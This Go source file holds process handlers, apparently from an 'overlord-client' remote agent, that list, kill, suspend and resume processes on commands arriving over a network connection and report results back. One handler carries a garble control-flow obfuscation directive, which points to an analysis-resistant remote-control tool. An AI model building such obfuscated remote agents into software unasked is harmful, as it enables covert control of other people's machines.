package handlers

import (
	"context"
	"log"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleProcessList(ctx context.Context, env *runtime.Env, cmdID string) error {
	log.Printf("process_list: listing all processes")

	processes := []wire.ProcessInfo{}
	var errMsg string

	procs, err := listProcesses()
	if err != nil {
		errMsg = err.Error()
		log.Printf("process_list error: %v", err)
	} else {
		processes = procs
	}

	result := wire.ProcessListResult{
		Type:      "process_list_result",
		CommandID: cmdID,
		Processes: processes,
		Error:     errMsg,
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessKill(ctx context.Context, env *runtime.Env, cmdID string, pid int32) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("process_kill: %d", pid)

	err := killProcess(pid)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessSuspend(ctx context.Context, env *runtime.Env, cmdID string, pid int32) error {
	log.Printf("process_suspend: %d", pid)

	err := suspendProcess(pid)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessResume(ctx context.Context, env *runtime.Env, cmdID string, pid int32) error {
	log.Printf("process_resume: %d", pid)

	err := resumeProcess(pid)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}
